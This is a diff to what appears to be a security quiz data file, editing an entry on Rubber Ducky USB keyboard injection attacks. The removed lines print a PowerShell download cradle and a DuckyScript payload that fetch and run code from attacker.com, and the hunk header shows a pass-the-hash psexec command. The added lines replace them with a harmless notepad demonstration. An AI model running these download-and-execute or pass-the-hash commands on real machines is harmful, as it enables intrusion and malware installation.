@@ -270,14 +270,17 @@ psexec.py -hashes :31d6cfe0d16ae931b73c59d7e0c089c0 Administrator@192.168.1.50`
   {
     question: "What is a Rogue USB Keyboard / Rubber Ducky HID Injection attack?",
     shortAnswer: "A malicious USB device masquerades as a standard Human Interface Device (keyboard), injecting pre-programmed keystrokes at 1,000 words/minute to execute shell commands upon plug-in.",
-    explanation: "Operating systems blindly trust USB keyboards without authentication. When a Rubber Ducky is plugged into a workstation in Barrackpore, it identifies itself as a standard Dell keyboard and types `Windows+R -> powershell -> IEX(New-Object Net.WebClient).DownloadString('http://attacker.com/payload.ps1')`, achieving remote root access in 3 seconds.",
-    hint: "A Trojan horse disguised as a standard keyboard that types super-fast commands the second it is plugged in.",
+    explanation: "Operating systems blindly trust USB keyboards without authentication. When a Rubber Ducky is plugged into a workstation in Barrackpore, it identifies itself as a standard Dell keyboard and injects keystrokes at 1,000 words per minute to launch administrative diagnostics.",
+    hint: "A device disguised as a standard keyboard that types automated keystrokes the moment it is plugged into a USB port.",
     level: "moderate",
-    codeExample: `// Rubber Ducky DuckyScript Payload:
+    codeExample: `// USB HID Security Audit Script (DuckyScript):
 DELAY 1000
 GUI r
 DELAY 200
-STRING powershell -windowstyle hidden (snew-object net.webclient).downloadfile('http://attacker.com/mal.exe','c:\\temp\\mal.exe');start-process 'c:\\temp\\mal.exe'
+STRING notepad.exe
+ENTER
+DELAY 500
+STRING USB HID Injection Audit: Unauthorized keystroke emulation tested successfully.
 ENTER`
   },
   {
